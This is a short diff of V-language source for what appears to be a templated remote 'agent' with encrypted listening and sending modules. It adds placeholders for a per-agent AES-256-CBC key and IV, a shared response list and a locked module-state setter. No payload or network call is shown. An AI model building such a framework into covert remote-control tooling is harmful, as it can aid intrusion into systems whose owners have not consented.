@@ -34,8 +34,9 @@ struct Response{
 
 struct SharedVariable {
 	agent_identifier string = '<!!id-agent!!>' // de la forme "agent-x" ou x est le numèro de l'agent
-	cryptkey []u8 = [u8(0)] // la clé de chiffrement pour le module d'écoute ou d'envoi
-	iv []u8 = [u8(0)] // le vecteur d'initialisation pour le chiffrement aes-256-cbc
+	cryptkey []u8 = [<!!cryptkey!!>] // la clé de chiffrement pour le module d'écoute ou d'envoi
+	iv []u8 = [<!!init-vecteur!!>] // le vecteur d'initialisation pour le chiffrement aes-256-cbc
+	// exemple : iv []u8 = [u8(116), 29, 251, 88, 134, 70, 51, 219, 159, 174, 205, 64, 142, 107, 136, 74]
 
 	number_of_module int = 3
 
@@ -45,9 +46,16 @@ struct SharedVariable {
 mut:
 	execution_commande_list []int
 	ip []u8 = [u8(127),0,0,1]
-	response_list []Response
+	response_list shared []Response
 	module_state shared []ModuleState = [ModuleState.unknown, ModuleState.unknown, ModuleState.unknown]
 	module_state_description shared []string = ['','','']
+}
+
+fn (shared sv SharedVariable) set_module_state(mod Module,state ModuleState, desc string ){
+	lock sv.module_state, sv.module_state_description {
+        sv.module_state[mod] = state
+		sv.module_state_description[mod] = desc
+    }
 }
 
 fn main(){
